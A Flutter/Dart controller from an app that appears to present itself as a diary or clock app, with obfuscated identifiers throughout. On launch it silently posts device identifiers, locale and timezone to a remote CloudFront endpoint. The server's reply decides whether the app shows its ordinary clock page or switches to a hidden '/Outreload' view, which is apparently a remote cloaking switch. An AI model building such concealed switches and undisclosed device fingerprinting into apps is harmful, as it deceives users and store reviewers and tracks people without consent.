import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class DiaryTransLogic extends GetxController {

  var zmcegbjnsh = RxBool(false);
  var cnhgbxjofz = RxBool(true);
  var pjqaslo = RxString("");
  var dkjfc = RxBool(false);
  var tywbdmx = RxBool(true);
  final snyute = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dewcntv();
  }


  Future<void> dewcntv() async {
    dkjfc.value = true;
    tywbdmx.value = true;
    cnhgbxjofz.value = false;

    snyute.post("https://d357oagvnfucn4.cloudfront.net/wzfgvatykernuo?no_check",data: await uzvkedsf()).then((value) {
      var rhnk = value.data["rhnk"] as String;
      var pckdshy = value.data["pckdshy"] as bool;
      if (pckdshy) {
        pjqaslo.value = rhnk;
        mnywfi();
      } else {
        olghumr();
      }
    }).catchError((e) {
      cnhgbxjofz.value = true;
      tywbdmx.value = true;
      dkjfc.value = false;
    });
  }

  Future<Map<String, dynamic>> uzvkedsf() async {
    final DeviceInfoPlugin neyzc = DeviceInfoPlugin();
    PackageInfo obhwxi_vsxf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var budhwmzg = Platform.localeName;
    var qrj_oYrW = currentTimeZone;

    var qrj_holPUJ = obhwxi_vsxf.packageName;
    var qrj_ldieC = obhwxi_vsxf.version;
    var qrj_uQD = obhwxi_vsxf.buildNumber;

    var qrj_YjrWsOm = obhwxi_vsxf.appName;
    var qrj_qCP = "";
    var qrj_qjK  = "";
    var qrj_CntAqi = "";
    var ogrenjw = "";
    var fqdxsw = "";
    var eanlh = "";
    var qtofrk = "";
    var xtohsy = "";
    var dsregvzi = "";
    var bhpud = "";


    var qrj_cAXkGb = "";
    var qrj_yG = false;

    if (GetPlatform.isAndroid) {
      qrj_cAXkGb = "android";
      var boutjxc = await neyzc.androidInfo;

      qrj_CntAqi = boutjxc.brand;

      qrj_qCP  = boutjxc.model;
      qrj_qjK = boutjxc.id;

      qrj_yG = boutjxc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qrj_cAXkGb = "ios";
      var gbyxraou = await neyzc.iosInfo;
      qrj_CntAqi = gbyxraou.name;
      qrj_qCP = gbyxraou.model;

      qrj_qjK = gbyxraou.identifierForVendor ?? "";
      qrj_yG  = gbyxraou.isPhysicalDevice;
    }

    var res = {
      "qrj_YjrWsOm": qrj_YjrWsOm,
      "qrj_uQD": qrj_uQD,
      "qrj_ldieC": qrj_ldieC,
      "qrj_holPUJ": qrj_holPUJ,
      "qrj_yG": qrj_yG,
      "qrj_qCP": qrj_qCP,
      "qrj_oYrW": qrj_oYrW,
      "qrj_CntAqi": qrj_CntAqi,
      "qrj_qjK": qrj_qjK,
      "budhwmzg": budhwmzg,
      "qrj_cAXkGb": qrj_cAXkGb,
      "ogrenjw" : ogrenjw,
      "fqdxsw" : fqdxsw,
      "eanlh" : eanlh,
      "qtofrk" : qtofrk,
      "xtohsy" : xtohsy,
      "dsregvzi" : dsregvzi,
      "bhpud" : bhpud,

    };
    return res;
  }

  Future<void> olghumr() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> mnywfi() async {
    Get.offNamed("/Outreload");
  }

}
